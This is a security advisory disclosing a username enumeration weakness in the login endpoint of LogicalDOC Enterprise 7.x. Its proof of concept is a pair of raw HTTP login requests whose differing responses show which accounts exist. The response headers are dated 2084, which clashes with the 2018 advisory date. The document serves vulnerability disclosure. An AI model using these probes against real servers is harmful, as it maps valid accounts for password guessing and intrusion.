@@ -1,0 +1,86 @@
+LogicalDOC Enterprise 7.7.4 Username Enumeration Weakness
+
+
+Vendor: LogicalDOC Srl
+Product web page: https://www.logicaldoc.com
+Affected version: 7.7.4
+                  7.7.3
+                  7.7.2
+                  7.7.1
+                  7.6.4
+                  7.6.2
+                  7.5.1
+                  7.4.2
+                  7.1.1
+
+Summary: LogicalDOC is a free document management system that is designed
+to handle and share documents within an organization. LogicalDOC is a content
+repository, with Lucene indexing, Activiti workflow, and a set of automatic
+import procedures.
+
+Desc: The weakness is caused due to the 'j_spring_security_check' script
+and how it verifies provided credentials. Attacker can use this weakness
+to enumerate valid users on the affected node.
+
+Tested on: Microsoft Windows 10
+           Linux Ubuntu 16.04
+           Java 1.8.0_161
+           Apache-Coyote/1.1
+           Apache Tomcat/8.5.24
+           Apache Tomcat/8.5.13
+           Undisclosed 8.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5451
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5451.php
+
+
+26.01.2018
+
+--
+
+
+Request/response for existent username:
+---------------------------------------
+
+POST /j_spring_security_check HTTP/1.1
+Host: 192.168.1.74:8080
+
+j_username=admin&j_password=123123&j_successurl=%2Ffrontend.jsp&j_failureurl=%2Flogin.jsp
+
+--
+
+HTTP/1.1 302 
+Set-Cookie: ldoc-failure=wrongpassword
+Location: //login.jsp?failure=wrongpassword
+Content-Length: 0
+Date: Tue, 06 Feb 2084 19:42:15 GMT
+Connection: close
+
+
+Request/response for non-existent username:
+-------------------------------------------
+
+POST /j_spring_security_check HTTP/1.1
+Host: 192.168.1.74:8080
+
+j_username=n00b&j_password=123123&j_successurl=%2Ffrontend.jsp&j_failureurl=%2Flogin.jsp
+
+--
+
+HTTP/1.1 500 
+Set-Cookie: JSESSIONID=F06F1D03E249D90802AFE92428DBBEDD; Path=/; Secure; HttpOnly
+Content-Type: text/html;charset=UTF-8
+Content-Length: 78
+Date: Tue, 06 Feb 2084 19:57:14 GMT
+Connection: close
+
+<html>
+<body>
+  <div><br/><br/><strong>ERROR</strong></div>
+</body>
+<html>
